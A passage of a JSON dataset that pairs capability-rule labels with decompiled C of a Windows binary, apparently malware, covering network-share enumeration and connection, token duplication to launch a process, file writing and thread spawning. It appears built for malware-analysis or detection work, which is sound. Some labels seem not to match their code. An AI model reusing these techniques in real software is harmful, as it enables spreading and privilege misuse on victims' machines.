            if ((uVar2 < uVar3 >> 2) && (unaff_EDI[0xd] <= uVar3 >> 1)) {\n                    fcn.0040264d();\n                }\n                if ((unaff_EDI[10] & 2) != 0) {\n                    unaff_EDI[10] = unaff_EDI[10] & 0xfffffffd;\n                    (*pcVar4)(*unaff_EDI);\n                }\n                var_4h = 1;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 442
    },
    "00402bb8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402bb8(uint hKey, uint lpSubKey, uint lpValueName, uint lpData)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    uint lpType;\n    uint phkResult;\n    uint32_t lpcbData;\n    uint var_4h;\n    \n    lpcbData = *unaff_ESI * 2 + 2;\n    var_4h = 0;\n    lpType = 1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(phkResult, lpValueName, 0, &lpType, lpData, &lpcbData);\n        if ((iVar1 == 0) || (iVar1 == 0xea)) {\n            var_4h = 1;\n            *unaff_ESI = (lpcbData >> 1) - 1;\n        }\n        else {\n            var_4h = 0;\n            *unaff_ESI = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return var_4h;\n}\n",
        "token_count": 300
    },
    "00406246": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406246(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint var_4h;\n    \n    uVar1 = 0x8000;\n    iVar2 = 0xf;\n    do {\n        if ((*(*(param_1 + 0xc) + -2 + *(param_1 + 4) * 2) & uVar1) != 0) {\n            return iVar2 + -0x10 + *(param_1 + 4) * 0x10;\n        }\n        uVar1 = uVar1 >> 1;\n        bVar3 = iVar2 != 0;\n        iVar2 = iVar2 + -1;\n    } while (bVar3);\n    return -1;\n}\n",
        "token_count": 182
    },
    "00401a9c": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a9c(uint arg_8h, int32_t arg_ch, uint *arg_10h, int16_t **arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    int16_t *extraout_EDX;\n    int16_t *piVar8;\n    int16_t *piVar9;\n    uint uVar10;\n    int32_t iStack32;\n    int16_t *piStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint auStack12 [2];\n    \n    iStack32 = -1;\n    iStack20 = 0;\n    auStack12[0] = 0x4000;\n    iStack24 = fcn.00404cfe(0x4000);\n    piStack28 = fcn.00404cfe(0x10000);\n    if (iStack24 != 0) {\n        if (piStack28 != NULL) {\n            iVar3 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(arg_8h, 0, 0, arg_ch, &iStack20);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(iStack20, &iStack32, iStack24, auStack12);\n                while ((iVar3 == 0 && (iVar3 = fcn.00404c0c(),  iVar3 == 0))) {\n                    while (iVar3 = iStack24,  iStack32 != 0) {\n                        iStack32 = iStack32 + -1;\n                        iVar4 = iStack32 * 0x20 + iStack24;\n                        if ((*(iVar4 + 0xc) & 2) == 0) {\n                            if (((*(iVar4 + 4) & 1) != 0) &&\n                               (uVar5 = fcn.00404d94(*(iVar4 + 0x14)),  iVar3 = iStack24,  uVar5 < 0x8008)) {\n                                iVar4 = fcn.00404f6c(*(iStack32 * 0x20 + 0x14 + iStack24), L\"\\\\\\\\?\\\\UNC\\\\\\\\\\\\\u4449\", 8);\n                                piVar8 = piStack28;\n                                if (iVar4 == 0) {\n                                    piVar9 = *(iStack32 * 0x20 + 0x14 + iVar3);\n                                }\n                                else {\n                                    for (piVar9 = *(iStack32 * 0x20 + 0x14 + iVar3); *piVar9 == 0x5c;\n                                        piVar9 = piVar9 + 1) {\n                                    }\n                                    fcn.00404c71(piStack28, L\"\\\\\\\\?\\\\UNC\\\\\\\\\\\\\u4449\", 0x10);\n                                    piVar8 = piVar8 + 8;\n                                }\n                                fcn.00404fd3(piVar8, piVar9);\n                                piVar8 = *arg_14h;\n                                iStack16 = 0;\n                                if (piVar8 != NULL) {\n                                    while (iVar1 = *piVar8,  piVar9 = piStack28,  iVar1 != 0) {\n                                        while (((iVar1 != 0 && (*piVar9 != 0)) &&\n                                               (iVar2 = fcn.00408681(),  piVar8 = extraout_EDX,  iVar1 == iVar2))) {\n                                            piVar8 = extraout_EDX + 1;\n                                            piVar9 = piVar9 + 1;\n                                            iVar1 = *piVar8;\n                                        }\n                                        iVar3 = iStack16;\n                                        if (*piVar8 == *piVar9) goto code_r0x00401c46;\n                                        iStack16 = iStack16 + 1;\n                                        do {\n                                            iVar1 = *piVar8;\n                                            piVar8 = piVar8 + 1;\n                                        } while (iVar1 != 0);\n                                    }\n                                }\n                                iVar3 = -1;\ncode_r0x00401c46:\n                                if (iVar3 < 0) {\n                                    fcn.00402a3d(arg_14h);\n                                    uVar10 = arg_10h[2];\n                                    uVar7 = *arg_10h;\n                                    uVar6 = fcn.00402e19();\n                                    uVar6 = fcn.0040160b(uVar6);\n                                    iVar3 = fcn.00404b5c(piStack28, uVar6, uVar7, uVar10);\n                                    if (iVar3 != 0) {\n                                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                                    }\n                                    iVar3 = arg_10h[1];\n                                    if (iVar3 != 0) {\n                                        uVar10 = arg_10h[2];\n                                        uVar7 = fcn.00402e19();\n                                        uVar7 = fcn.0040160b(uVar7);\n                                        iVar3 = fcn.00404b5c(piStack28, uVar7, iVar3, uVar10);\n                                        if (iVar3 != 0) {\n                                            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                        else if ((arg_1ch != 0) &&\n                                ((arg_ch == 0 ||\n                                 (((*(arg_ch + 0x14) != 0 && (*(iVar4 + 0x14) != 0)) &&\n                                  (iVar4 = fcn.00404dad(*(arg_ch + 0x14), *(iVar4 + 0x14)),  iVar4 != 0)))))) {\n                            fcn.00401a9c(arg_8h, iStack32 * 0x20 + iVar3, arg_10h, arg_14h, arg_18h, arg_1ch + -1);\n                        }\n                    }\n                    iStack32 = -1;\n                    auStack12[0] = 0x4000;\n                    iVar3 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(iStack20, &iStack32, iStack24, auStack12);\n                }\n            }\n            if (iStack20 != 0) {\n                (*_sym.imp.MPR.dll_WNetCloseEnum)(iStack20);\n            }\n        }\n        fcn.00404d6a(iStack24);\n    }\n    if (piStack28 != NULL) {\n        fcn.00404d6a(piStack28);\n    }\n    return 0;\n}\n",
        "token_count": 1487
    },
    "0040211e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0040211e(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint8_t *puVar7;\n    code *pcStack640;\n    uchar *puStack636;\n    int32_t aiStack632 [4];\n    code *pcStack616;\n    uchar *puStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    code *pcStack592;\n    uint *puVar8;\n    uint8_t *puStack556;\n    int32_t iStack552;\n    int32_t iStack548;\n    int32_t iStack544;\n    int32_t iStack540;\n    uint32_t uStack448;\n    uchar auStack406 [402];\n    \n    iStack544 = 0;\n    iStack540 = 0;\n    iStack552 = 0;\n    fcn.00404c43(&stack0xfffffe6a, 0, 0x18e);\n    if (*0x40a468 == -0x40a468) {\n        return 0;\n    }\n    iVar2 = fcn.004056ca(*0x40a46c);\n    if (iVar2 != *0x40a490) {\n        return 0;\n    }\n    *0x40a4a0 = fcn.00407ec6(0x40a470);\n    if (*0x40a4a0 == 0) {\n        return 0;\n    }\n    puStack556 = fcn.00407f6a(0x2d, 0);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.00405450(uVar3);\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    if ((*puStack556 & 1) == 0) {\ncode_r0x00402236:\n        iStack552 = fcn.00404bda();\n        if (iStack552 == 0) goto code_r0x004024b6;\n        iStack548 = fcn.00404bda();\n        if (iStack548 != 0) {\n            iVar2 = fcn.00402ed1();\n            if (iVar2 == 0) {\n                iVar2 = fcn.00403f8c(0);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.0040405b(1);\n                    puVar8 = unaff_ESI;\n                    if ((iVar2 != 0) && (iVar2 = fcn.00403933(),  puVar8 = unaff_ESI,  iVar2 != 0)) {\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                        puVar8 = unaff_ESI;\n                    }\n                    goto code_r0x0040236a;\n                }\n                iVar2 = fcn.0040405b(1);\n                if ((iVar2 != 0) &&\n                   ((((*unaff_ESI & 4) == 0 || (iVar2 = fcn.0040208b(),  iVar2 == 0)) && ((*unaff_ESI & 2) != 0)))) {\n                    iVar2 = 0x32;\n                    iVar5 = fcn.004039d9();\n                    while (iVar5 != 0) {\n                        iVar2 = iVar2 + -1;\n                        iVar5 = fcn.0040405b(1);\n                        if (iVar5 == 0) break;\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                        iVar5 = iVar2;\n                    }\n                }\n            }\n            else {\n                iVar2 = fcn.00403f8c(1);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.0040405b(0);\n                    if ((iVar2 != 0) && (iVar2 = fcn.00403a68(),  iVar2 != 0)) {\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                    }\n                    puVar8 = unaff_ESI;\n                    if ((*unaff_ESI & 8) != 0) {\n                        fcn.00403e55();\n                    }\n                    if (((*unaff_ESI & 0x10) != 0) && (iVar2 = fcn.00407f6a(0x29, 0),  iVar2 != 0)) {\n                        fcn.00403dfd(iVar2, 5000);\n                        pcStack592 = 0x4022d0;\n                        fcn.00402b99(iVar2);\n                    }\ncode_r0x0040236a:\n                    fcn.00401236();\n                    uVar3 = *unaff_ESI;\n                    uVar6 = fcn.00402e19();\n                    pcStack592 = 0x40237f;\n                    iStack544 = fcn.00401771(0, uVar6, uVar3);\n                    uVar3 = *unaff_ESI;\n                    uVar6 = fcn.00402e19();\n                    pcStack592 = 0x40239b;\n                    iStack540 = fcn.00401771(1, uVar6, uVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_CreateThread;\n                    unaff_ESI = puVar8;\n                    if (iStack544 != 0) {\n                        pcStack592 = fcn.00402013;\n                        uStack596 = 0;\n                        uStack600 = 0;\n                        uStack604 = 0x4023e0;\n                        iVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)();\n                        uVar4 = iVar2 != 0;\n                        uStack604 = 0;\n                        uStack608 = 0;\n                        puStack612 = &stack0xfffffdd0;\n                        pcStack616 = fcn.00401fab;\n                        aiStack632[3] = 0;\n                        aiStack632[2] = 0;\n                        aiStack632[1] = 0x4023fa;\n                        iVar2 = (*pcVar1)();\n                        *(&stack0xfffffdd0 + uVar4 * 4) = iVar2;\n                        if (iVar2 != 0) {\n                            uVar4 = uVar4 + 1;\n                        }\n                        aiStack632[1] = 0;\n                        aiStack632[0] = 0;\n                        puStack636 = &stack0xfffffdc4;\n                        pcStack640 = fcn.00401e4e;\n                        iVar2 = (*pcVar1)(0, 0);\n                        *(&stack0xfffffdb8 + uVar4 * 4) = iVar2;\n                        if (iVar2 != 0) {\n                            uVar4 = uVar4 + 1;\n                        }\n                        (*pcVar1)(0, 0, fcn.00401859, &stack0xfffffda0, 0, 0);\n                        uVar3 = 0;\n                        puVar7 = NULL;\n                        iVar2 = (*pcVar1)(0, 0, fcn.0040197c, &stack0xfffffd88, 0, 0);\n                        *(&stack0xfffffd88 + uVar4 * 4) = iVar2;\n                        if (iVar2 != 0) {\n                            uVar4 = uVar4 + 1;\n                        }\n                        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar3, 0xffffffff);\n                        iVar2 = fcn.00404c0c();\n                        if (((iVar2 == 0) && (fcn.00401000(),  (*puVar7 & 8) != 0)) &&\n                           (iVar2 = fcn.00402ed1(),  iVar2 != 0)) {\n                            fcn.00403e55();\n                        }\n                        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar4, &stack0xfffffd80, 1, 0xffffffff);\n                        if (puStack556 == NULL) goto code_r0x004024a5;\n                        while( true ) {\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)();\ncode_r0x004024a5:\n                            unaff_ESI = puVar8;\n                            if (uVar4 == 0) break;\n                            uVar4 = uVar4 - 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    else {\n        pcStack592 = 0x800;\n        uStack596 = 0x402219;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar2 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = uStack448 >> 9 & 1;\n        }\n        if (uVar4 == 0) goto code_r0x00402236;\n    }\n    if (iStack552 != 0) {\n        fcn.00404c28();\n    }\ncode_r0x004024b6:\n    if (iStack548 != 0) {\n        fcn.00404c28();\n    }\n    fcn.00402b57(unaff_ESI, 4);\n    if (iStack544 != 0) {\n        fcn.0040174d();\n    }\n    if (iStack540 != 0) {\n        fcn.0040174d();\n    }\n    if (unaff_EBX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)();\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    fcn.00407e94();\n    return 0;\n}\n",
        "token_count": 2130
    },
    "0040287d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040287d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *unaff_EDI;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = *(unaff_EDI[9] + 0x14);\n    uVar3 = uVar2 - *(unaff_EDI[9] + 0x10);\n    iVar1 = fcn.00404d94(arg_8h);\n    var_4h = iVar1 * 2 + 6;\n    if ((*(unaff_EDI + 10) & 1) != 0) {\n        return 0;\n    }\n    if (uVar3 < var_4h) {\n        for (; uVar3 = uVar3 + uVar2,  uVar3 < var_4h; uVar2 = uVar2 * 2) {\n        }\n        if ((unaff_EDI[0xc] <= uVar2 && uVar2 != unaff_EDI[0xc]) || (iVar1 = fcn.0040264d(),  iVar1 == 0)) {\n            unaff_EDI[10] = unaff_EDI[10] | 2;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)(*unaff_EDI);\n            return 0;\n        }\n    }\n    var_4h = var_4h - 4;\n    fcn.0040266b(&var_4h, 4);\n    fcn.0040266b(arg_8h, var_4h);\n    unaff_EDI[0xb] = unaff_EDI[0xb] + 1;\n    if ((unaff_EDI[10] & 4) != 0) {\n        unaff_EDI[10] = unaff_EDI[10] & 0xfffffffb;\n        (*_sym.imp.KERNEL32.dll_SetEvent)(unaff_EDI[1]);\n        (*_sym.imp.KERNEL32.dll_ResetEvent)(unaff_EDI[2]);\n    }\n    return var_4h;\n}\n",
        "token_count": 476
    },
    "00402928": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402928(uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    puVar1 = in_EAX + 3;\n    while( true ) {\n        (*pcVar2)(puVar1);\n        iVar3 = fcn.0040287d(arg_8h);\n        if ((iVar3 != 0) || ((*(in_EAX + 10) & 1) != 0)) break;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*in_EAX, 0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return iVar3;\n}\n",
        "token_count": 208
    },
    "00401d71": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00401d71(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iStack592;\n    ushort uStack588;\n    ushort uStack586;\n    uint uStack584;\n    ushort uStack580;\n    ushort uStack578;\n    ushort uStack576;\n    ushort uStack574;\n    uchar *puStack568;\n    uint auStack564 [2];\n    uchar auStack556 [20];\n    uchar auStack536 [4];\n    uchar auStack532 [528];\n    \n    uStack580 = 0;\n    uStack578 = 0;\n    uStack576 = 0;\n    uStack574 = 0;\n    puStack568 = NULL;\n    puVar2 = auStack564;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    uStack586 = 0;\n    uStack588 = 2;\n    iStack592 = 0x102;\n    uStack584 = arg_8h;\n    fcn.00404c71(auStack536, 0x409360, 4);\n    iStack592 = iStack592 + -2;\n    iVar1 = (*_sym.imp.WS2_32.dll_WSAAddressToStringW)(&uStack588, 0x10, 0, auStack532, &iStack592);\n    if (iVar1 == 0) {\n        puStack568 = auStack556;\n        uStack588 = 2;\n        uStack586 = 0;\n        uStack576 = 2;\n        uStack574 = 0;\n        iVar1 = (*_sym.imp.MPR.dll_WNetUseConnectionW)(0, &uStack588, 0, 0, 0, 0, 0, &iStack592);\n        if (iVar1 == 0) {\n            fcn.00401a9c(2, &uStack588, *arg_ch, arg_ch[1], arg_ch[2], 0x80);\n        }\n    }\n    iVar1 = fcn.00404c0c();\n    return iVar1 == 0;\n}\n",
        "token_count": 512
    },
    "00404c43": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00404c43(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    \n    if (arg_10h != 0) {\n        piVar2 = arg_8h;\n        for (uVar1 = arg_10h >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *piVar2 = arg_ch * 0x1010101;\n            piVar2 = piVar2 + 1;\n        }\n        for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n            *piVar2 = arg_ch * 0x1010101;\n            piVar2 = piVar2 + 1;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 218
    },
    "00402b09": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402b09(uint lpFileName, uint lpBuffer)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t unaff_EBX;\n    bool bVar3;\n    uint lpNumberOfBytesWritten;\n    \n    bVar3 = false;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x40000000, 0, 0, 2, 0, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1, lpBuffer);\n        bVar3 = iVar2 != 0 && in_ECX == unaff_EBX;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return bVar3;\n}\n",
        "token_count": 188
    },
    "004035e3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004035e3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uStack660;\n    int32_t iStack652;\n    uint uStack648;\n    int32_t iStack644;\n    int32_t iStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    int32_t iStack624;\n    uint uStack620;\n    int32_t iStack616;\n    uint uStack612;\n    int32_t iStack608;\n    uint uStack604;\n    uint uStack600;\n    uchar auStack592 [24];\n    uchar auStack568 [20];\n    uchar auStack548 [544];\n    \n    iStack652 = fcn.00407f6a(0x22, auStack592);\n    iStack608 = iStack652;\n    iVar1 = fcn.00404d81(iStack652);\n    iStack652 = iVar1 + 1 + iStack652;\n    uStack604 = 0;\n    arg_8h_00 = fcn.00402e19();\n    iVar1 = fcn.00407f6a(0x20, &iStack644);\n    iVar2 = fcn.00404d94(iVar1);\n    uStack636 = 0;\n    uStack648 = 0x10;\n    iVar2 = fcn.00402bb8(0x80000002, iVar1, iVar1 + 2 + iVar2 * 2, auStack568);\n    if (iVar2 != 0) {\n        uStack636 = fcn.00405261(auStack568, 0, 10);\n    }\n    fcn.00402b57(iVar1, iStack644);\n    iStack640 = 0;\n    uStack628 = 0;\n    uStack620 = fcn.00402d53(0x18);\n    uStack648 = fcn.00407f6a(0x16, 0);\n    iStack644 = fcn.00407f6a(0x23, 0);\n    iStack616 = fcn.00402d53(0x1c);\n    iStack624 = fcn.00404cfe(0x209);\n    uStack612 = 0;\n    uStack600 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iStack608, iStack652);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    fcn.004085bb();\n    fcn.00402e5c(&iStack608, 0);\n    if (uStack612 < 6) goto code_r0x004038bf;\n    iVar1 = fcn.004034c0();\n    if (iVar1 == 0) goto code_r0x004038bf;\n    iVar1 = fcn.00403464();\n    if (iVar1 != 5) goto code_r0x004038bf;\n    iVar1 = fcn.0040854d(uStack636);\n    if (iVar1 == 0) goto code_r0x004038bf;\n    iVar1 = fcn.0040861d(auStack548, 0x104, 2);\n    if (iVar1 == 0) goto code_r0x004038bf;\n    if (pcVar4 == NULL) {\ncode_r0x00403791:\n        iVar1 = 0;\n    }\n    else {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&iStack624);\n        iVar1 = (*pcVar4)(uVar3);\n        if ((iVar1 == 0) || (iVar1 = 1,  iStack624 == 0)) goto code_r0x00403791;\n    }\n    iStack640 = fcn.00407f6a(0x2c - (iVar1 != 0), &iStack652);\n    if (iStack640 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(auStack548, 0x40000000, 0, 0, 2, 0, 0);\n        pcVar4 = _sym.imp.KERNEL32.dll_WriteFile;\n        if (iVar2 != -1) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, iStack640, iStack652, &iStack644, 0);\n            if ((iVar5 != 0) && (iStack644 == iStack652)) {\n                iVar5 = (*pcVar4)(iVar2, uStack636, 0x208, &iStack644, 0);\n                if ((iVar5 != 0) && (iStack644 == 0x208)) {\n                    (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar2);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                    iVar2 = fcn.00402f79(uStack628);\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.004033bd(auStack548, 0, iVar1, uStack648);\n                        if (iVar2 != 0) {\n                            iStack616 = fcn.00402f36(arg_8h_00, uStack660);\n                            if (iStack616 != 0) {\n                                (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg_8h, 0xffffffff);\n                            }\n                            fcn.004033bd(0, 1, iVar1, uStack648);\n                            fcn.00402f79(uStack636);\n                            (*_sym.imp.KERNEL32.dll_DeleteFileW)(auStack548);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x004038bf:\n    fcn.00402e5c(iStack608, 1);\n    fcn.00402b7a(uStack628);\n    fcn.00402b57(iStack640, iStack652);\n    fcn.00404c43(auStack548, 0, 0x20a);\n    fcn.00402b7a(uStack632);\n    fcn.00402b57(uStack620, uStack604);\n    fcn.00402b7a(arg_8h_00);\n    fcn.00402b7a(uStack660);\n    return iStack616;\n}\n",
        "token_count": 1452
    },
    "004039d9": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.004039d9(void)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    arg_ch = fcn.00407f6a(0x15, 0);\n    arg_8h = fcn.00404cfe(0x20a);\n    if (5 < uVar1) {\n        iVar2 = fcn.004034c0();\n        if (iVar2 != 0) {\n            fcn.00402e5c(&var_8h, 0);\n            if ((arg_ch != 0) && (arg_8h != 0)) {\n                iVar2 = fcn.0040854d(arg_8h);\n                if (iVar2 != 0) {\n                    var_4h = fcn.00402f36(arg_8h, arg_ch);\n                }\n            }\n            fcn.00402e5c(var_8h, 1);\n        }\n    }\n    if (arg_8h != 0) {\n        fcn.00404d6a(arg_8h);\n    }\n    fcn.00402b7a(arg_ch);\n    return var_4h;\n}\n",
        "token_count": 312
    },
    "00403a68": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403a68(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_90h;\n    uint var_8ch;\n    uint lpTokenAttributes;\n    uint var_40h;\n    uint uStack64;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    int32_t lpModuleName;\n    uint lpdwProcessId;\n    uint var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t hExistingToken;\n    int32_t phNewToken;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    iVar2 = fcn.00407f6a(0x24, &var_24h);\n    lpModuleName = iVar2;\n    iVar3 = fcn.00404d81(iVar2);\n    var_4h = fcn.00404cfe(0x20a);\n    lpdwProcessId = 0;\n    var_14h = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    var_10h = 0;\n    hExistingToken = 0;\n    phNewToken = 0;\n    var_90h = 0;\n    fcn.00404c43(&var_8ch, 0, 0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    var_38h = 0;\n    var_34h = 0;\n    uStack52 = 0;\n    uStack48 = 0;\n    lpTokenAttributes = 0;\n    var_40h = 0;\n    uStack64 = 0;\n    if (5 < var_14h) {\n        fcn.00402e5c(&var_28h, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3 + 1 + iVar2);\n        var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        if ((var_14h != NULL) && (var_4h != 0)) {\n            iVar2 = fcn.0040854d(var_4h);\n            if (iVar2 != 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(iVar2, &lpdwProcessId);\n                    if (iVar2 != 0) {\n                        var_10h = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, lpdwProcessId);\n                        if (var_10h != 0) {\n                            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(var_10h, 0x2000000, &hExistingToken);\n                            if (iVar2 != 0) {\n                                lpTokenAttributes = 0xc;\n                                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)\n                                                  (hExistingToken, 0x2000000, &lpTokenAttributes, 2, 1, &phNewToken);\n                                if (iVar2 != 0) {\n                                    var_18h = (*var_14h)(phNewToken, 0, var_4h, 0, 0, 0, 0, &var_90h, &var_38h);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        fcn.00402e5c(var_28h, 1);\n        if (var_10h != 0) {\n            (*pcVar1)(var_10h);\n        }\n    }\n    if (var_38h != 0) {\n        (*pcVar1)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar1)(var_34h);\n    }\n    if (hExistingToken != 0) {\n        (*pcVar1)(hExistingToken);\n    }\n    if (phNewToken != 0) {\n        (*pcVar1)(phNewToken);\n    }\n    if (var_4h != 0) {\n        fcn.00404d6a(var_4h);\n    }\n    fcn.00402b57(lpModuleName, var_24h);\n    return var_18h;\n}\n",
        "token_count": 1015
    },
    "0040545d": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
